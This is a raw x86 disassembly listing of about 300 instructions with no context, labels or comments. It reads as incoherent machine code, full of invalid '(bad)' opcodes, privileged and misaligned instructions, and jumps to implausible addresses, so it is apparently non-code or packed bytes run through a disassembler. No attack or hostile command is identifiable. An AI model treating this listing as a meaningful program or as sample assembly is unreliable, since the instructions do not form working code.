  4113d4:	inc    ebp
  4113d5:	mov    WORD PTR [ebx-0x38cde7b7],cs
  4113db:	or     al,BYTE PTR [ebx+ecx*4+0x932f89d]
  4113e2:	jmp    0x4113b3
  4113e4:	push   0xffffff8c
  4113e6:	dec    DWORD PTR [ebp-0xc]
  4113e9:	xor    al,BYTE PTR [ebp+0x3a]
  4113ec:	push   eax
  4113ed:	jne    0x411409
  4113ef:	mov    edi,edi
  4113f1:	in     al,0x8b
  4113f3:	add    BYTE PTR [eax],cl
  4113f5:	(bad)  
  4113f6:	dec    ebp
  4113f7:	test   BYTE PTR [ebx],dh
  4113f9:	dec    ecx
  4113fa:	add    esi,DWORD PTR [edx]
  4113fc:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  411402:	or     bh,cl
  411404:	(bad)  
  411405:	mov    ebx,es
  411407:	dec    ecx
  411408:	push   0x32
  41140a:	lea    esi,[edx]
  41140c:	xchg   esp,eax
  41140d:	mov    ebp,eax
  41140f:	call   0xd0401e0c
  411414:	inc    ebp
  411415:	mov    WORD PTR [ebx+0x45321849],es
  41141b:	or     bh,bh
  41141d:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  411423:	iret   
  411424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411425:	mov    WORD PTR [ebp+0x4d],es
  411428:	push   eax
  411429:	xor    bl,dh
  41142b:	cmp    bh,bh
  41142d:	jne    0x4113ba
  41142f:	lea    ecx,[eax]
  411431:	lods   al,BYTE PTR ds:[esi]
  411432:	dec    ebp
  411433:	call   0xff450e6b
  411438:	cmp    ecx,DWORD PTR [ebp+0x74]
  41143b:	cmp    ebp,DWORD PTR [edx+0x74]
  41143e:	dec    DWORD PTR [ebx-0x38baf758]
  411444:	add    eax,ebx
  411446:	fadd   DWORD PTR [ebp-0x18]
  411449:	mov    edi,eax
  41144b:	lock inc edi
  41144e:	inc    ebp
  41144f:	test   BYTE PTR [ebx+0x832a89d],cl
  411455:	xor    eax,DWORD PTR [ebp-0x75]
  411458:	add    ecx,DWORD PTR [eax]
  41145a:	sbb    BYTE PTR [ebp+0x45],dl
  41145d:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  411463:	rdpmc  
  411465:	test   DWORD PTR [ebx],0xc18b0fff
  41146b:	or     BYTE PTR [ebp+0x4d],cl
  41146e:	mov    esi,DWORD PTR [ebx]
  411470:	rol    BYTE PTR [ebx],1
  411472:	iret   
  411473:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7463]
  41147a:	cmp    ecx,DWORD PTR [ebp+0xf]
  41147d:	xor    edx,DWORD PTR [edi-0x73]
  411480:	dec    DWORD PTR [eax]
  411482:	mov    esi,DWORD PTR [edx+0x10]
  411485:	add    BYTE PTR [ebp+0x77],al
  411488:	mov    DWORD PTR [eax],ebx
  41148a:	jmp    0x411501
  41148c:	or     DWORD PTR [ebp-0x179b6b64],0xff65f3bf
  411496:	pop    edi
  411497:	inc    ebp
  411498:	pop    ebx
  411499:	mov    eax,edx
  41149b:	loopne 0x41149d
  41149d:	(bad)  
  41149e:	mov    eax,ebx
  4114a0:	push   ecx
  4114a1:	ror    DWORD PTR [ebx+0x4d450813],0x33
  4114a8:	push   esi
  4114a9:	add    edi,DWORD PTR [edi+0x7180850]
  4114af:	inc    ebp
  4114b0:	(bad)  
  4114b1:	push   eax
  4114b2:	popf   
  4114b3:	dec    edi
  4114b4:	xor    bh,bh
  4114b6:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  4114bc:	adc    al,0x89
  4114be:	adc    BYTE PTR [ecx+eax*1],0x75
  4114c2:	add    bh,bh
  4114c4:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  4114cb:	fadd   DWORD PTR [eax]
  4114cd:	call   0xff45075d
  4114d2:	cmp    al,0x45
  4114d4:	dec    ebp
  4114d5:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  4114db:	ret    
  4114dc:	mov    eax,ecx
  4114de:	adc    al,0x11
  4114e0:	add    al,0x0
  4114e2:	add    BYTE PTR [ebp+0x0],dh
  4114e5:	mov    edi,edi
  4114e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e8:	push   eax
  4114e9:	inc    ebp
  4114ea:	add    BYTE PTR [eax-0x2f],dl
  4114ed:	adc    eax,0x8b45ff03
  4114f2:	xor    edx,esp
  4114f4:	add    ecx,DWORD PTR [ebp-0x77]
  4114f7:	add    esp,edi
  4114f9:	mov    eax,DWORD PTR [ebp-0x58]
  4114fc:	inc    DWORD PTR [ebp+0x14]
  4114ff:	mov    DWORD PTR [ebp+0x18],eax
  411502:	push   eax
  411503:	inc    ebp
  411504:	dec    DWORD PTR [ebx-0x388ae7f4]
  41150a:	call   0xfff10fd2
  41150f:	mov    eax,DWORD PTR [ebp+0x8]
  411512:	mov    edx,DWORD PTR [ebp+0x33]
  411515:	xor    eax,DWORD PTR [ebx]
  411517:	lea    edi,[ebx]
  411519:	adc    DWORD PTR [edx+esi*2-0x75],esi
  41151d:	add    BYTE PTR [ecx+eax*8],cl
  411520:	dec    ebp
  411521:	xor    BYTE PTR [ebx],0xfc
  411524:	add    edi,edi
  411526:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  41152a:	mov    eax,ebx
  41152c:	pop    edi
  41152d:	push   es
  41152e:	leave  
  41152f:	or     dl,BYTE PTR [eax]
  411531:	xor    eax,0x7fec2d55
  411536:	in     al,0xec
  411538:	adc    DWORD PTR [edx+0x14],0x5e
  41153c:	xor    eax,0x53149cc9
  411541:	push   ebp
  411542:	dec    esp
  411543:	in     al,dx
  411544:	or     BYTE PTR [ecx+0x57],dl
  411547:	inc    ebp
  411548:	inc    ecx
  411549:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  41154f:	push   esi
  411550:	and    al,0x51
  411552:	mov    edx,0x7be0833
  411557:	jb     0x411553
  411559:	add    BYTE PTR [ebp+0x30132c6],bl
  41155f:	inc    ebp
  411560:	mov    DWORD PTR [ebx+0x8b9424],ecx
  411566:	or     al,0x8b
  411568:	jl     0x4114f5
  41156a:	sbb    al,0x14
  41156c:	dec    ebp
  41156d:	xor    BYTE PTR [ebp+0x1],0x8b
  411571:	add    BYTE PTR [eax+eax*1],ah
  411574:	xor    eax,DWORD PTR [ecx-0x75]
  411577:	mov    esp,DWORD PTR [esp+edx*1]
  41157a:	add    ecx,DWORD PTR [ecx+0xca010f]
  411580:	dec    esp
  411581:	dec    ecx
  411582:	adc    BYTE PTR [edx-0x15],ch
  411585:	push   0x103039
  41158a:	sbb    al,0x70
  41158c:	inc    esp
  41158d:	push   0x10
  41158f:	dec    DWORD PTR [ecx+ecx*4+0x18]
  411593:	mov    eax,edx
  411595:	or     BYTE PTR [edi+eax*8+0x4532c69d],al
  41159c:	mov    DWORD PTR [ebx+0x75681024],ecx
  4115a2:	test   DWORD PTR [ebp+0x530efcf8],ecx
  4115a8:	jge    0x41161f
  4115aa:	xor    edi,edi
  4115ac:	pushf  
  4115ad:	or     BYTE PTR [ebp+0x6c],dh
  4115b0:	push   0xf88b85ff
  4115b5:	or     BYTE PTR [ebp+0xb],dh
  4115b8:	inc    edi
  4115ba:	or     dh,al
  4115bc:	jb     0x411586
  4115be:	call   DWORD PTR [eax]
  4115c0:	mov    DWORD PTR [ebp+0x24],eax
  4115c3:	mov    ebp,ebx
  4115c5:	adc    bh,bh
  4115c7:	(bad)  
  4115c8:	and    al,0xc6
  4115ca:	lea    ebp,[edi+0x1fffc24]
  4115d0:	or     BYTE PTR [esi+0x74],bl
  4115d3:	ret    0x20
  4115d6:	je     0x411563
  4115d8:	sbb    al,0x83
  4115da:	mov    edi,0xe8ecfff8
  4115df:	mov    ecx,0xf81485ff
  4115e4:	je     0x41156f
  4115e6:	pop    esp
  4115e7:	and    al,0x75
  4115e9:	push   esi
  4115ea:	and    al,0x8d
  4115ec:	and    al,0xfd
  4115ee:	inc    BYTE PTR [ebx+ecx*4+0x18]
  4115f2:	and    al,0x7c
  4115f4:	pop    edi
  4115f5:	adc    BYTE PTR [ebx+0x56],bl
  4115f8:	in     eax,0x51
  4115fa:	ret    0x33
  4115fd:	mov    esi,0x187200
  411602:	pushf  
  411603:	inc    BYTE PTR [ecx+0x1614857c]
  411609:	jge    0x4115a7
  41160b:	mov    DWORD PTR [esp],ecx
  41160e:	(bad)  
  41160f:	cmp    DWORD PTR [eax],ebx
  411611:	adc    BYTE PTR [eax],bl
  411613:	push   ss
  411614:	dec    DWORD PTR [edi+edi*8+0x18]
  411618:	adc    al,0xca
  41161a:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  41161e:	into   
  41161f:	scas   eax,DWORD PTR es:[edi]
  411620:	mov    DWORD PTR [eax+edx*2],esp
  411623:	das    
  411624:	inc    ebp
  411625:	jne    0x4115b2
  411627:	and    al,0x8b
  411629:	and    al,0x33
  41162b:	lea    ecx,[eax]
  41162d:	jb     0x411673
  41162f:	xor    ebp,ebx
  411631:	adc    al,bh
  411633:	xor    bh,bh
  411635:	jne    0x41167b
  411637:	sbb    al,0xff
  411639:	.byte 0xe8
  41163a:	inc    esp
  41163b:	pop    esi
  41163c:	pop    ebp
